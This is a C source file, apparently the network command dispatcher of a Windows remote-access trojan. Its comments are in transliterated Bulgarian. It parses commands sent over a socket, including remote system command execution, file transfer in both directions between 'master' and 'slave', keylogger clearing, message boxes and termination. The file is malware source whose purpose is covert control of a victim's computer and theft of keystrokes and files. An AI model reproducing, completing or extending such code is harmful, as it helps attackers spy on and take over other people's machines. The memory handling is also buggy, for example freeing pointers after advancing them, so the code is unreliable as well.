#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include "net/commands.h"
#include "net/interface.h"
#include "logger.h"
#include "server.h"
#include "types.h"

char* net_cmdList[NET_CMD_TOTAL] = { "", "echo ", "indentify", "system ", "send_file ", "get_file ", "msci_sound ", "keylog_clear", "mbox ", "terminate"};
int net_cmdLenList[NET_CMD_TOTAL] = { 0, 5, 9, 7, 10, 9, 11, 12, 5, 9 };
int net_cmdArgsList[NET_CMD_TOTAL] = { 0, 1, 0, 1, 1, 1, 1, 0, 1, 0 };

int net_equalsCmd(char* msg, int cmd, int msgLen)
{
	if(!strncmp(msg, net_cmdList[cmd], net_cmdLenList[cmd]))
	{
		if(net_cmdArgsList[cmd] == 1)
		{
			if(msgLen > net_cmdLenList[cmd])
			{
				return 1;
			}

			return 0;
		}

		return 1;
	}

	return 0;
}

//izchistva samata komanda i ostavq argumentite
void net_formatCmd(OUT_STRP msg, OUT_INT msgLen, int cmd)
{
	int i;
	char* tmsg = *msg;

	for(i = 0; i < net_cmdLenList[cmd]; i++)
	{
		*tmsg++;
	}

	*msg = tmsg; 
	*msgLen = strlen(tmsg);
	free(tmsg);
}

//0 - ako nqma poveche argumenti 1 - ako sme fanali argument
char* net_exportArgs(char* msg, OUT_STRP arg)
{
	int i;
	int index = 0;
	int msgLen = strlen(msg);

	for(i = 0; i != msgLen + 1; i++)
	{
		if(msg[i] == ';' && msg[i + 1] == ' ')
		{
			index = i;
			break;
		}
	}

	if(index == 0)
	{
		*arg = 0;

		return msg;
	}

	char* outMsg = malloc(index + sizeof(char));
	memset(outMsg, 0, index + 1);
	strncpy(outMsg, msg, index);
	*arg = outMsg;
	
	for(i = 0; i != index + 2; i++)
	{
		*msg++;
	}

	return msg;
}

void net_makeToRawCmd(int cmd, OUT_STRP msg, OUT_INT msgLen)
{
	char* rmsg = malloc(*msgLen + 1 + sizeof(char));
	memset(rmsg, 0, *msgLen + 1);
	*rmsg++;
	strncpy(rmsg, *msg, *msgLen);
	*rmsg--;
	*rmsg = cmd;

	*msgLen = *msgLen + 1;
	*msg = rmsg;

	free(msg);
}

int net_ExecuteCmd(char* msg, int msgLen, SOCKET sock)
{
	if(!msg || !msgLen)
	{
		LOG(LOG_ERR, "Непозната команда!\n");
		return 1;
	}

	if(!strcmp(msg, "exit"))
	{
		exit(0);
	}

	if(net_equalsCmd(msg, NET_CMD_ECHO, msgLen))
	{
		return net_cmd_Echo(msg, msgLen, sock);
	}else if(net_equalsCmd(msg, NET_CMD_INDENTIFY, msgLen)){
		return net_cmd_Indentify(msg, msgLen, sock);
	}else if(net_equalsCmd(msg, NET_CMD_SYSTEM, msgLen)){
		return net_cmd_System(msg, msgLen, sock);
	}else if(net_equalsCmd(msg, NET_CMD_SEND_FILE_MASTER_SLAVE, msgLen)){
		return net_cmd_MS(msg, msgLen, sock);
	}else if(net_equalsCmd(msg, NET_CMD_SEND_FILE_SLAVE_MASTER, msgLen)){
		return net_cmd_SM(msg, msgLen, sock);
	}else if(net_equalsCmd(msg, NET_CMD_PLAYSOUND, msgLen)){
		return net_cmd_PlaySound(msg, msgLen, sock);
	}else if(net_equalsCmd(msg, NET_CMD_KEYLOGGER_CLEAR, msgLen)){
		return net_cmd_kl_Clear(msg, msgLen, sock);
	}else if(net_equalsCmd(msg, NET_CMD_MESSAGEBOX, msgLen)){
		return net_cmd_Mbox(msg, msgLen, sock);
	}else if(net_equalsCmd(msg, NET_CMD_TERMINATE, msgLen)){
		return net_cmd_Terminate(msg, msgLen, sock);
	}else{
		LOG(LOG_ERR, "Непозната команда!\n");
	}

	return 1;
}